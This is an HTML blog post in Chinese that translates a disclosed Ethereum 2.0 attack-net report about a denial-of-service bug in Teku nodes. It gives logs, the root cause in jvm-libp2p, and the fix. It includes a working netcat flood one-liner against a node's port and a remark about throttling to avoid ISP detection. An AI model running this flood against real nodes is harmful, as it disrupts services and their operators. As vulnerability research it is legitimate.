@@ -1,0 +1,358 @@
+<html>
+      <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <meta name="referrer" content="never">
+        <title>Ethereum DoS Attack on Teku Notes | 戏</title>
+        <link rel="stylesheet" href="https://cdn.staticfile.org/KaTeX/0.11.1/katex.min.css">
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+        <link rel="stylesheet" href="https://blog.leepanda.top/styles/main.css">
+          <script src="https://blog.leepanda.top/media/scripts/mdui.min.js"></script>
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://fonts.googleapis.com/css?family=Dancing+Script|Ma+Shan+Zheng&display=swap" rel="stylesheet">
+        <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+        <script src="https://blog.leepanda.top/media/scripts/script.js"></script>
+        <script >hljs.initHighlightingOnLoad();</script>
+        
+
+    </head>
+    <body class="mdui-theme-primary-purple mdui-theme-accent-purple">
+        <header class="index-img mdui-m-b-3"  style="background-image: url(https://blog.leepanda.top/post-images/ethereum-dos-attack-on-teku-notes.png);" >
+                          <button class="mdui-btn  mdui-btn-icon mdui-btn-dense mdui-color-theme-500 mdui-ripple yinying mdui-m-t-1 mdui-m-l-1" mdui-menu="{target: '#demo-attr-cascade'}"><i class="mdui-icon material-icons">&#xe5d2;</i></button>
+                <ul class="mdui-menu" id="demo-attr-cascade">
+                
+                        <li class="mdui-menu-item">
+                          <a href="/" class="mdui-ripple">首页</a>
+                        </li>
+                
+                        <li class="mdui-menu-item">
+                          <a href="/archives" class="mdui-ripple">归档</a>
+                        </li>
+                
+                        <li class="mdui-menu-item">
+                          <a href="/tags" class="mdui-ripple">标签</a>
+                        </li>
+                
+                      </ul>
+
+        </header>
+        <div class="mdui-container post">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                         <article class="mdui-shadow-10 mdui-p-a-2 post-list">
+                           <div class="mdui-typo-display-1 mdui-m-b-3">Ethereum DoS Attack on Teku Notes</div>
+                           <a  class="index-list-biaoqian ">2021-05-29</a>
+                           <div class="mdui-typo mdui-m-t-3 post-neirong"><h1 id="abstract">Abstract</h1>
+<p>前些日子，以太坊2.0开放了attack-net攻击网环境。白帽子们在此链上对新版本的ETH进行众测。<br>
+7月27日，ETH官方确认了第一个漏洞。本文将该漏洞的issue翻译成中文。<br>
+发现该漏洞的白帽子为<a href="https://twitter.com/JonnyRhea/status/1286810750896541698?s=20">JonnyRhea</a></p>
+<h1 id="description">Description</h1>
+<p>该漏洞可导致Teku节点被DoS攻击，从而无法参与共识。</p>
+<blockquote>
+<p>这里说的Teku 是attack-net中一条测试链的名字<br>
+同样是Attack-net测试链的还有 prysm、lighthouse</p>
+</blockquote>
+<h1 id="attack-scenario">Attack scenario</h1>
+<ol>
+<li>这个DoS攻击将持续破坏链节点的一致性。</li>
+<li>等到攻击停止后，需要手动修复，ETH才能恢复运行。</li>
+<li>受害者节点的内存将被大量消耗。最终导致宿主机重启。</li>
+<li>受害者节点的本地时钟会变慢。(<code>had trouble staying connected to peers and one node's local clock was 20 mins slow.</code>)</li>
+</ol>
+<h1 id="details">Details</h1>
+<h3 id="how-the-attack-was-implemented">How the attack was implemented</h3>
+<ul>
+<li>DoS攻击命令如下:<br>
+<code>while true; do cat /dev/zero | pv -L 1M |nc XXX.XXX.XXX.XXX 9000 &gt;/dev/null; done</code><br>
+其中<code>XXX.XXX.XXX.XXX</code>是被攻击节点地址。</li>
+</ul>
+<p>上述命令，是以<code>1M/s</code>的速率向目标节点的<code>9000</code>端口发送垃圾数据。<br>
+虽说发送垃圾数据的速率是越高越好，但是由于实验环境部署在AWS服务器上,<br>
+为了避免DoS攻击被AWS-ISP发现，只能将每个攻击节点的数据发送速率限制在1M/s。</p>
+<ul>
+<li>当攻击启动时，界面如下:<br>
+<img src="https://img-blog.csdnimg.cn/20200817145837902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NlbWFvNDU0OA==,size_16,color_FFFFFF,t_70#pic_center" alt="DoS攻击界面" loading="lazy"><br>
+我们可以看到<code>Ncat: Connection reset by peer</code>,也就是说目标节点已经崩溃。</li>
+</ul>
+<h1 id="attack-log">Attack log</h1>
+<h3 id="epoch-407-slot-13038">Epoch 407, Slot 13038</h3>
+<p>在区块高度407，jrhea正在研究前文命令的参数(1M/s等(cy))会对节点造成怎样的影响。</p>
+<blockquote>
+<p>jrhea(本文作者，编写漏洞报告)在实验中部署了5个节点来执行上述命令，发起DoS攻击。</p>
+</blockquote>
+<pre><code>14:49:44.309 INFO  - Epoch Event *** Epoch: 407, Justified checkpoint: 405, Finalized checkpoint: 404, Finalized root: 062423..e652
+14:49:48.308 INFO  - Slot Event  *** Slot: 13024, Block: 615a62..0c80, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:50:00.308 INFO  - Slot Event  *** Slot: 13025, Block: 8a66bc..feaa, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:50:12.313 INFO  - Slot Event  *** Slot: 13026, Block: 6e35b1..ab31, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:50:24.312 INFO  - Slot Event  *** Slot: 13027, Block: bd188c..2c39, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:50:36.308 INFO  - Slot Event  *** Slot: 13028, Block: 1b0189..b486, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:50:48.308 INFO  - Slot Event  *** Slot: 13029, Block: 434b19..dc64, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:51:00.311 INFO  - Slot Event  *** Slot: 13030, Block: d092fa..b2d7, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:51:12.308 INFO  - Slot Event  *** Slot: 13031, Block: 9e7060..95b2, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:51:24.307 INFO  - Slot Event  *** Slot: 13032, Block: e57155..e417, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:51:36.312 INFO  - Slot Event  *** Slot: 13033, Block: 0ffe8c..e62f, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:51:48.386 INFO  - Slot Event  *** Slot: 13034, Block: 8c383d..7c25, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:52:00.439 INFO  - Slot Event  *** Slot: 13035, Block: fea7e4..b7fa, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:52:12.321 INFO  - Slot Event  *** Slot: 13036, Block: 4ccd48..179b, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:52:24.309 INFO  - Slot Event  *** Slot: 13037, Block: 7cc87d..6fbc, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:52:36.664 INFO  - Slot Event  *** Slot: 13037, Block: 7cc87d..6fbc, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:52:36.679 INFO  - Slot Event  *** Slot: 13038, Block:    ... empty, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:52:48.314 INFO  - Slot Event  *** Slot: 13039, Block: f715fa..e290, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:53:04.832 INFO  - Slot Event  *** Slot: 13040, Block: 42490f..62e6, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:53:12.330 INFO  - Slot Event  *** Slot: 13041, Block: 600f4c..b61e, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:53:24.311 INFO  - Slot Event  *** Slot: 13042, Block: 21e864..8c00, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:53:36.066 INFO  - Slot Event  *** Slot: 13043, Block: b7b47d..a011, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:53:48.309 INFO  - Slot Event  *** Slot: 13044, Block: e81b23..de2a, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:54:00.310 INFO  - Slot Event  *** Slot: 13045, Block: 751785..2159, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:54:12.314 INFO  - Slot Event  *** Slot: 13046, Block: 790c4d..8969, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:54:24.308 INFO  - Slot Event  *** Slot: 13047, Block: 4b0ddf..d0a3, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:54:36.308 INFO  - Slot Event  *** Slot: 13048, Block: def5c5..b03c, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:54:48.315 INFO  - Slot Event  *** Slot: 13049, Block: 526686..6923, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:55:00.308 INFO  - Slot Event  *** Slot: 13050, Block: 742dd8..e0c7, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:55:12.308 INFO  - Slot Event  *** Slot: 13051, Block: 3998fb..e6af, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:55:24.310 INFO  - Slot Event  *** Slot: 13052, Block: 80f285..f2cb, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:55:36.321 INFO  - Slot Event  *** Slot: 13053, Block: 3533b1..b9f2, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:55:48.309 INFO  - Slot Event  *** Slot: 13054, Block: 941bba..b7f5, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+14:56:00.308 INFO  - Slot Event  *** Slot: 13055, Block: 2a9ec8..5ecf, Epoch: 407, Finalized checkpoint: 405, Finalized root: 3e178e..4e06, Peers: 4
+</code></pre>
+<p>可见仅有一个Slot没有完成共识，各个Slot运行的还不错。<br>
+不过已经可以被攻击了。</p>
+<h3 id="epoch-413">Epoch 413</h3>
+<p>确认可以攻击后，加大力度。在413高度，jrhea部署了两台攻击服务器。<br>
+攻击效果如下</p>
+<pre><code>15:28:08.307 INFO  - Epoch Event *** Epoch: 413, Justified checkpoint: 411, Finalized checkpoint: 410, Finalized root: 416c3e..b60f
+15:28:12.311 INFO  - Slot Event  *** Slot: 13216, Block: 7dbf5d..d3b4, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:28:24.312 INFO  - Slot Event  *** Slot: 13217, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:28:36.313 INFO  - Slot Event  *** Slot: 13218, Block: da4820..6513, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:28:48.308 INFO  - Slot Event  *** Slot: 13219, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:29:00.313 INFO  - Slot Event  *** Slot: 13220, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:29:12.310 INFO  - Slot Event  *** Slot: 13221, Block: d83ee6..48ac, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:29:24.315 INFO  - Slot Event  *** Slot: 13222, Block: a4a16d..b36c, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:29:36.315 INFO  - Slot Event  *** Slot: 13223, Block: 289d84..d5d3, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:29:48.310 INFO  - Slot Event  *** Slot: 13224, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:30:00.314 INFO  - Slot Event  *** Slot: 13225, Block: f4a443..b60a, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+15:30:12.312 INFO  - Slot Event  *** Slot: 13226, Block: bfeb6e..775c, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+15:30:24.309 INFO  - Slot Event  *** Slot: 13227, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+15:30:36.313 INFO  - Slot Event  *** Slot: 13228, Block: 97b3b5..f158, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+15:30:48.314 INFO  - Slot Event  *** Slot: 13229, Block: b7753d..f479, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:31:00.314 INFO  - Slot Event  *** Slot: 13230, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:31:12.310 INFO  - Slot Event  *** Slot: 13231, Block: a8b392..d105, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:31:24.309 INFO  - Slot Event  *** Slot: 13232, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:31:36.309 INFO  - Slot Event  *** Slot: 13233, Block: 358b2b..7cc1, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:31:48.313 INFO  - Slot Event  *** Slot: 13234, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:32:00.310 INFO  - Slot Event  *** Slot: 13235, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:32:12.311 INFO  - Slot Event  *** Slot: 13236, Block: d03f7d..39c6, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:32:24.314 INFO  - Slot Event  *** Slot: 13237, Block: 130f18..7f02, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 4
+15:32:36.313 INFO  - Slot Event  *** Slot: 13238, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:32:48.308 INFO  - Slot Event  *** Slot: 13239, Block: 650904..57e4, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:33:00.314 INFO  - Slot Event  *** Slot: 13240, Block: dbe53b..9fc5, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:33:12.311 INFO  - Slot Event  *** Slot: 13241, Block: dbf67f..91b9, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:33:24.310 INFO  - Slot Event  *** Slot: 13242, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:33:36.314 INFO  - Slot Event  *** Slot: 13243, Block: f434a0..2b47, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:33:48.309 INFO  - Slot Event  *** Slot: 13244, Block:    ... empty, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:34:00.310 INFO  - Slot Event  *** Slot: 13245, Block: 99611b..7279, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:34:12.309 INFO  - Slot Event  *** Slot: 13246, Block: dbeda2..8263, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+15:34:24.314 INFO  - Slot Event  *** Slot: 13247, Block: de10af..01ac, Epoch: 413, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+</code></pre>
+<p>可见无法达成共识的slot更多了。<br>
+于是jrhea再次加大力度。</p>
+<h3 id="epoch-420">Epoch 420</h3>
+<p>在420高度，jrhea决定大力出奇迹。<br>
+他部署了两台AWS服务器，三台macbook.<br>
+这五台设备同时攻击Teku节点。<br>
+攻击效果如下:</p>
+<pre><code>16:12:56.312 INFO  - Epoch Event *** Epoch: 420, Justified checkpoint: 417, Finalized checkpoint: 411, Finalized root: 404586..3714
+16:13:00.314 INFO  - Slot Event  *** Slot: 13440, Block: b2f665..fb2c, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:13:12.313 INFO  - Slot Event  *** Slot: 13441, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:13:24.310 INFO  - Slot Event  *** Slot: 13442, Block: d47239..99f3, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:13:36.310 INFO  - Slot Event  *** Slot: 13443, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:13:48.315 INFO  - Slot Event  *** Slot: 13444, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:14:00.310 INFO  - Slot Event  *** Slot: 13445, Block: b274e6..7bf0, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:14:12.310 INFO  - Slot Event  *** Slot: 13446, Block: 5b92e9..b20e, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:14:24.311 INFO  - Slot Event  *** Slot: 13447, Block: 72c4f8..e9e6, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:14:36.310 INFO  - Slot Event  *** Slot: 13448, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:14:48.314 INFO  - Slot Event  *** Slot: 13449, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:15:00.309 INFO  - Slot Event  *** Slot: 13450, Block: 5c37d1..36c7, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:15:12.310 INFO  - Slot Event  *** Slot: 13451, Block: 5d9ff8..eaa3, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:15:24.309 INFO  - Slot Event  *** Slot: 13452, Block: a5430f..862e, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:15:36.309 INFO  - Slot Event  *** Slot: 13453, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:15:48.310 INFO  - Slot Event  *** Slot: 13454, Block: e13879..fd6e, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:16:00.309 INFO  - Slot Event  *** Slot: 13455, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:16:12.310 INFO  - Slot Event  *** Slot: 13456, Block: 9b1dd9..347f, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+16:16:24.310 INFO  - Slot Event  *** Slot: 13457, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+16:16:36.310 INFO  - Slot Event  *** Slot: 13458, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 3
+16:16:48.309 INFO  - Slot Event  *** Slot: 13459, Block: 0a56d5..349d, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:17:00.314 INFO  - Slot Event  *** Slot: 13460, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:17:12.310 INFO  - Slot Event  *** Slot: 13461, Block: d0a2ac..6b65, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:17:24.309 INFO  - Slot Event  *** Slot: 13462, Block: cf45b0..a373, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:17:36.312 INFO  - Slot Event  *** Slot: 13463, Block: 504865..d930, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:17:48.313 INFO  - Slot Event  *** Slot: 13464, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:18:00.315 INFO  - Slot Event  *** Slot: 13465, Block: 02ac2a..339f, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:18:12.310 INFO  - Slot Event  *** Slot: 13466, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:18:24.314 INFO  - Slot Event  *** Slot: 13467, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:18:36.311 INFO  - Slot Event  *** Slot: 13468, Block:    ... empty, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:18:48.313 INFO  - Slot Event  *** Slot: 13469, Block: f2db72..11ba, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:19:00.310 INFO  - Slot Event  *** Slot: 13470, Block: c82f1d..a399, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+16:19:12.312 INFO  - Slot Event  *** Slot: 13471, Block: 7a5b91..30e7, Epoch: 420, Finalized checkpoint: 411, Finalized root: 404586..3714, Peers: 2
+</code></pre>
+<p>可见大部分slot无法达成共识。</p>
+<h1 id="principle">Principle</h1>
+<blockquote>
+<p>原理分析部分的作者是<a href="https://github.com/ajsutton">ajsutton</a><br>
+<a href="https://github.com/ethereum/public-attacknets/issues/7#issuecomment-665966067">原文连接</a></p>
+</blockquote>
+<h3 id="第一层原因">第一层原因</h3>
+<ul>
+<li>ETH2.0的通信协议中，每种消息都有对应的前缀。而上述攻击中的&quot;一大串0&quot; 没有匹配到任何一类MSG，使得节点无法解析。</li>
+<li>而且正常的MSG都以<code>\n</code>结尾，而这&quot;一大串0&quot; 以<code>\x00</code>结尾，使得节点无法解析。</li>
+</ul>
+<p>对于这些恶意MSG，jvm-libp2p 都回复<code>na</code></p>
+<h3 id="第二层原因">第二层原因</h3>
+<ul>
+<li>节点每收到1个byte都会转化为多比特的信息，这导致了流量放大DoS攻击称为可能。</li>
+<li>jvm-libp2p回复<code>na</code>的速度，比读<code>\x00</code>的速度慢，<br>
+jvm-libp2p接受buff的比输出的多。</li>
+</ul>
+<p>最终，节点将开始占用系统内存.堆内或堆外内存都会被大量占用。CPU占用也会大幅飙升。</p>
+<h3 id="解决方案设想">解决方案设想</h3>
+<p>解决这个问题最直接的办法，就是当接收到无效MSG的时候，就断开P2P连接。我们在<a href="https://github.com/libp2p/jvm-libp2p/pull/126">libp2p/jvm-libp2p#126</a>实现了这个方案。但这个fix还没有推送到Teku那边，因为还有一些点要完善。</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>该漏洞是一个典型的DoS漏洞，触发点在解析p2p消息的地方。<br>
+如果消息无法解析，将会占用节点大量内存和CPU。</p>
+<h1 id="reference">Reference</h1>
+<ul>
+<li>ETH2.0 中的各种名词 <a href="https://ethfans.org/posts/ethereum-2-0-terms-demystified">https://ethfans.org/posts/ethereum-2-0-terms-demystified</a></li>
+<li>ETH2.0的三条众测链 <a href="https://github.com/ethereum/public-attacknets/tree/master/attacknets/beta-0">https://github.com/ethereum/public-attacknets/tree/master/attacknets/beta-0</a></li>
+<li>DoS Attack on Teku Stops Finality <a href="https://github.com/ethereum/public-attacknets/issues/7">https://github.com/ethereum/public-attacknets/issues/7</a></li>
+</ul>
+</div>
+                              <div class="mdui-divider mdui-m-t-3"></div>
+                              <div class="mdui-row-xs-2 mdui-m-t-2">
+  <div class="mdui-col"> <div class="mdui-text-left"><a href="https://blog.leepanda.top/post/gofuzz-wu-fa-zheng-chang-hong-fa-crash-yan-jiu/">GoFuzz无法正常触发crash研究</a></div></div>
+ <div class="mdui-col"><div class="mdui-text-right "><a href="https://blog.leepanda.top/post/yi-pian-wen-zhang-kan-bu-dong-ru-he-shi-yong-afl-fuzz-apache/">一篇文章看不懂，如何使用AFL Fuzz Apache</a></div> </div>
+                                </div>
+                                <div class="mdui-divider mdui-m-t-2"></div>
+   
+ <script src="https://blog.leepanda.top/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+            app_id: 'IEi2zCTY1XD4rD7nJ4awDcpn-gzGzoHsz',
+
+
+            app_key: 'LK0B9F5PMRXfeesBEQb4G1sw',
+
+
+            placeholder: '上班累了...躺会儿吧',
+            
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                         </article>
+                 <div class="toc-container mdui-float-right">
+                <ul class="markdownIt-TOC">
+<li><a href="#abstract">Abstract</a></li>
+<li><a href="#description">Description</a></li>
+<li><a href="#attack-scenario">Attack scenario</a></li>
+<li><a href="#details">Details</a><br>
+*
+<ul>
+<li><a href="#how-the-attack-was-implemented">How the attack was implemented</a></li>
+</ul>
+</li>
+<li><a href="#attack-log">Attack log</a><br>
+*
+<ul>
+<li><a href="#epoch-407-slot-13038">Epoch 407, Slot 13038</a></li>
+<li><a href="#epoch-413">Epoch 413</a></li>
+<li><a href="#epoch-420">Epoch 420</a></li>
+</ul>
+</li>
+<li><a href="#principle">Principle</a><br>
+*
+<ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E5%B1%82%E5%8E%9F%E5%9B%A0">第一层原因</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%E5%8E%9F%E5%9B%A0">第二层原因</a></li>
+<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E8%AE%BE%E6%83%B3">解决方案设想</a></li>
+</ul>
+</li>
+<li><a href="#conclusion">Conclusion</a></li>
+<li><a href="#reference">Reference</a></li>
+</ul>
+
+              </div>
+
+                        </div>
+                 </div>
+          
+        </div>
+        <script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $.viewImage({
+                    'target'  : '.post-neirong img',
+                    'exclude' : '.vsmile-icons img , .song-links-item img',
+                    'delay'   : 300
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+        <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                            
+                           
+                            
+                           
+                            	
+                        <li class="social-link"><a href="https://github.com/PandaTea" target="_blank"><i class="iconfont icon-github"></i></a></li>
+                         
+                           
+                            	
+                        <li class="social-link"><a href="https://www.zhihu.com/people/lee-congfei" target="_blank"><i class="iconfont icon-zhihu"></i></a></li>
+                         
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                            
+                           
+                      </ul>
+                    </nav>
+                  <div class="copyright">
+                      <p></p>
+                  </div>
+              </footer>
+    </body>
+</html>
